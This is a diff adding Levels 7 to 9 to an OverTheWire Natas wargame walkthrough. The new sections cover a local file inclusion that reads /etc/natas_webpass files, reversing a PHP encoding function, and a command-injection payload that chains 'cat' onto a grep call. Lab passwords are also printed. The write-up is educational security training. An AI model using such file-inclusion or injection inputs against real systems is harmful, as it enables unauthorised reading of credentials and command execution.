@@ -216,3 +216,175 @@ Aha! The first line has the code! Now we just need to go back, paste it into the
 Voilá! We are greeted with:
 
 `Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`
+
+# Level 7
+
+The page in Level 7 is dead simple. Two links, one for `Home` and another for `About`.
+
+Clicking them doesn't do much (yet) and reading the source we find:
+
+```html
+<div id="content">
+
+<a href="index.php?page=home">Home</a>
+<a href="index.php?page=about">About</a>
+<br>
+<br>
+this is the front page
+
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+</div>
+```
+
+However how can we access it? There's no input... 
+However when we click one of the links we see the page URL change.
+
+  - For the `Home` page we see `.../index.php?page=home` 
+  - And for the `About` page `.../index.php?page=about` 
+
+Maybe we could try something with it, since the server, when looking for the pages probably looks in the filesystem using the `page` variable value.
+
+We know that all passwords are located in `/etc/natas_webpass/natasX` so we go ahead and paste it on to our query string making it `page=/etc/natas_webpass/natas8` and we get our password.
+
+```html
+<div id="content">
+
+<a href="index.php?page=home">Home</a>
+<a href="index.php?page=about">About</a>
+<br>
+<br>
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+</div>
+```
+
+This is called a File Inclusion Vulnerability! You can read more about it [here](https://en.wikipedia.org/wiki/File_inclusion_vulnerability) and [here](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion).
+
+Remember to always validate your inputs!
+
+# Level 8
+
+Again, more PHP. Let's make quick!
+
+We go straight for the source code, because what is better than the source?
+Reading the source code we see the following snippet:
+
+```php
+<?
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+
+function encodeSecret($secret) {
+    return bin2hex(strrev(base64_encode($secret)));
+}
+
+if(array_key_exists("submit", $_POST)) {
+    if(encodeSecret($_POST['secret']) == $encodedSecret) {
+        print "Access granted. The password for natas9 is <censored>";
+    } else {
+        print "Wrong secret";
+    }
+}
+?>
+```
+
+We have one function that encodes a secret to [Base64](https://en.wikipedia.org/wiki/Base64),
+reverses the resulting string and converts the string to [hexadecimal](https://en.wikipedia.org/wiki/Hexadecimal) 
+(yes, [`bin2hex`](https://www.php.net/manual/en/function.bin2hex.php) is not binary to hexadecimal,
+always search before assuming anything - like I did the first time).
+
+After the function we have the actual script part, it checks if the `submit` variable exists in the request,
+if it exists it encodes the `secret` variable using `encodeSecret` and compares with the `$encodedSecret` variable,
+if they match we get the password!
+
+Since all operations done by `encodeSecret` are reversible we can start getting to work!
+
+  - First we will take `$encodedSecret` and convert it from hexadecimal to a string again
+  - Then we reverse the string order
+  - Finally we decode the Base64 result
+
+The resulting script more or less like this:
+
+```php
+<?php
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+
+function decodeSecret($secret) {
+  return base64_decode(strrev(hex2bin($secret)));
+}
+echo decodeSecret($encodedSecret);
+?>
+```
+
+Running this yields our secret which we now need to `POST` to the server. 
+We can simply send it by submitting it on the actual page, doing that we get the Level 9 password!
+
+```html
+<div id="content">
+
+Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+<form method="post">
+Input secret: <input name="secret"><br>
+<input type="submit" name="submit">
+</form>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+# Level 9
+
+Level 9 is tons of fun and we start to get a taste of how dangerous some vulnerabilities can be!
+
+We are greeted with an input field and more source code, again, straight to the source.
+Where we find:
+
+```php
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+```
+
+We can see, straight up `grep -i $key dictionary.txt` and `$key` is just taken from the request, no sanitization!
+Which means we can write anything there and it will execute with the `grep` command.
+
+## Example
+
+`http://natas9.natas.labs.overthewire.org/?needle=test&submit=Search`
+
+> Will run the script with `$key=test`, resulting in the execution of `grep -i test dictionary.txt`.
+
+`http://natas9.natas.labs.overthewire.org/?needle=.*&submit=Search`
+
+> Yields `grep -i .* dictionary.txt`.
+
+
+There are several ways we can solve this level, however we will opt through the most straightforward way, given this yells [Command Injection](https://www.owasp.org/index.php/Command_Injection);
+Given we can write anything into the string what we want to do is to the escape from the `grep` command and execute interesting stuff.
+
+We can do that by writing:
+
+```bash
+! dictionary.txt ; cat /etc/natas_webpass/natas10; grep -i !
+```
+
+Which results in the execution of the following command:
+
+```bash
+grep -i ! dictionary.txt ; cat /etc/natas_webpass/natas10; grep -i ! dictionary.txt
+```
+
+Breaking it down we can notice the same command in the beggining and the end.
+The usage of `!` is just so we don't get any matches from either `grep`'s and the `dictionary.txt` that we add in the input is just to avoid `grep` crashing.
+The `;` allows us to write another command to execute after the first one finished, 
+providing the ability to add the `cat /etc/natas_webpass/natas10` which will print the file.
+
+Could this be done in a shorter way? Yes, however we will need it further down the road.
